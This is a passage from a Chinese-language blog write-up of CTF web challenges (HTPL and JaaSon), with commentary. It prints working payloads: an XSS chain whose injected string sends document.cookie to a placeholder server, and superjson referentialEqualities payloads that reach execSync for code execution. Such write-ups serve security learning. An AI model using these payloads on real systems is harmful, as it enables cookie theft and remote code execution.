<p>會變成：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">write</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">alert</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">prompt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> $a$<span class="token operator">=</span><span class="token string">"x"</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$asd$<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token string">"toString"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> $b$<span class="token operator">=</span>$a$<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$asd$<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> $c$<span class="token operator">=</span><span class="token punctuation">(</span>$b$<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"alert(\"xss\")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>$c$<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>terjanq 的<a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436">解法</a>更短，直接利用 iframe + name 會拿到 window 的特性，去拿 iframe 裡的 eval（那個 if 拿掉也沒差）：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>$win$</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-program</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-if</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-num</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-num</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>win<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
                
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>asd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>        
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-array</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>eval<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-array</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-call</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>top.location='https://server/?c='+document.cookie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-call</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-if</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-program</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程式碼會是：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">write</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">alert</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">prompt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">const</span> $test$<span class="token operator">=</span>$win$<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$asd$<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>$test$<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"alert(1337)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2><span id="jaason6-solves">JaaSon(6 solves)</span></h2><p>同場加映一題 misc 的 JS 題，這題你可以給一個 json string，會被丟到 <a target="_blank" rel="noopener" href="https://github.com/blitz-js/superjson">superjson</a> 去。</p>
<p>用的雖然是有 prototype pollution 漏洞的版本，但是已經先用 <code>Object.freeze(Object.prototype)</code> 把 prototype 鎖起來，沒有 prototype pollution 可以用了。</p>
<p>這題還沒時間研究，但跟 superjson 內部運作的機制有關，可以透過 <code>referentialEqualities</code> 這東西去指定一些值，例如說：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
  <span class="token string-property property">"json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"brands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token punctuation">&#123;</span> <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"Sonar"</span> <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string-property property">"products"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token punctuation">&#123;</span> <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"SonarQube"</span><span class="token punctuation">,</span>  <span class="token string-property property">"brand"</span><span class="token operator">:</span> <span class="token keyword">null</span> <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token string-property property">"meta"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"referentialEqualities"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token string-property property">"brands.0"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"products.0.brand"</span><span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>就會執行 <code>products[0].brand = brands[0];</code>，看來應該是想透過這個解決 deep clone 時的 reference 問題。</p>
<p>詳情可以參考：<a target="_blank" rel="noopener" href="https://blog.sonarsource.com/blitzjs-prototype-pollution/">Remote Code Execution via Prototype Pollution in Blitz.js</a>，裡面解釋得比較完整。</p>
<p>其餘細節我就沒有再研究了，但看起來是透過這個功能把物件的一些東西換掉，</p>
<p>底下附上 szymex73 在 DC 貼的 payload：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
   <span class="token string-property property">"json"</span><span class="token operator">:</span><span class="token punctuation">[</span>
      <span class="token punctuation">[</span>
         <span class="token keyword">null</span><span class="token punctuation">,</span>
         <span class="token punctuation">[</span>
            <span class="token punctuation">&#123;</span>
               <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"console.log(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())"</span>
            <span class="token punctuation">&#125;</span>
         <span class="token punctuation">]</span>
      <span class="token punctuation">]</span>
   <span class="token punctuation">]</span><span class="token punctuation">,</span>
   <span class="token string-property property">"meta"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
      <span class="token string-property property">"values"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
         <span class="token string-property property">"2"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"map"</span>
         <span class="token punctuation">]</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token string-property property">"referentialEqualities"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
         <span class="token string-property property">"constructor.prototype"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"find.constructor"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.get"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"push"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.set"</span><span class="token punctuation">,</span>
            <span class="token string">"1.delete"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"pop"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.next"</span><span class="token punctuation">,</span>
            <span class="token string">"0.keys"</span><span class="token punctuation">,</span>
            <span class="token string">"1.charAt"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"2.constructor.prototype"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.__proto__"</span><span class="token punctuation">,</span>
            <span class="token string">"0.0"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"0.2"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.toString"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">""</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token punctuation">[</span>
               <span class="token punctuation">[</span>
                  <span class="token number">1</span>
               <span class="token punctuation">]</span>
            <span class="token punctuation">]</span>
         <span class="token punctuation">]</span>
      <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比起上面這個，我隊友 pew 的 payload 似乎比較好懂：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> superjson <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'superjson'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>default<span class="token punctuation">;</span>

Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>

javascript <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">console.log(process.mainModule.require('child_process').execSync("/readflag").toString())</span><span class="token template-punctuation string">`</span></span>

<span class="token keyword">var</span> json <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>
    <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">json</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">real_error</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string-property property">"message"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token literal-property property">real_map</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token literal-property property">fake_map</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token literal-property property">real_str</span><span class="token operator">:</span> <span class="token string">"xxd"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">real_arr</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token literal-property property">x</span><span class="token operator">:</span> javascript<span class="token punctuation">,</span>
            <span class="token literal-property property">js</span><span class="token operator">:</span> javascript<span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token literal-property property">meta</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
          <span class="token literal-property property">referentialEqualities</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string-property property">'real_error.toString'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.toString'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'constructor.constructor'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.get'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'real_str.replace'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.set'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'js'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'real_arr.constructor.prototype.values'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.keys'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'real_map.__proto__'</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.__proto__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'x'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.0'</span><span class="token punctuation">]</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
          <span class="token literal-property property">values</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">real_map</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                  <span class="token string">"map"</span>
              <span class="token punctuation">]</span><span class="token punctuation">,</span>
              <span class="token literal-property property">real_error</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                  <span class="token string">"Error"</span>
              <span class="token punctuation">]</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2><span id="後記">後記</span></h2><p>這次的題目都很有趣而且很新穎，例如說 Python 那題只用 decorator 做出任意程式碼執行就很酷，或是 foodAPI 直接考一個 denoDB 0-day，也是滿猛的。</p>
<p>SQLite 的神秘語法也是大開眼界，期待之後有人 po 出 write-up，從原始碼去解釋一下是哪一段有那個功能，到底是 feature 還是 bug。</p>
<p>而 HTPL 其實最後的考點還是 JS 的註解 <code>&lt;!--</code>，但被包裝起來以後就不是這麼容易發現，這種「拆開之後發現是自己熟悉的東西」，以題目來說我覺得滿理想的。</p>
<p>例如說像是 gif 那題，如果我沒解出來，我只會覺得我知識量不足，不知道 <code>..gif</code> 可以繞，或覺得看 code 能力不足，沒辦法看太底層。但像是 HTPL 這題，沒解出來但發現原來知識點是自己知道的，就會覺得題目包裝得十分巧妙。</p>
<p>突然覺得跟以前一些競程的題目有點像，有些題目解不出來是因為我真的沒學過那演算法，但有些題目層層拆解之後發現不會太難，只是包裝得很好，就會覺得「哇，這出題者好猛」</p>
<p>話說 terjanq 在我心目中是 CTF 界中前端、瀏覽器以及 JS 相關題目的 GOAT，感覺只要是這類型的題目，他就一定解得出來，真的很猛。</p>
<p>當然，其他強者也不是蓋的，每次都會發現難題幾乎都是固定那幾個 id 解掉XD</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/12/08/ctf-js-notes/">幾個與 Web 跟 JS 相關的 CTF 題目小記</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/10/08/sekaictf2022-safelist-and-connection/">SekaiCTF 2022 筆記與 concurrent limit</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">評論</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2025 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>繁體中文</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/10/31/en/hacklu-ctf-2022-writeup/" class="dropdown-item">
                    English
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>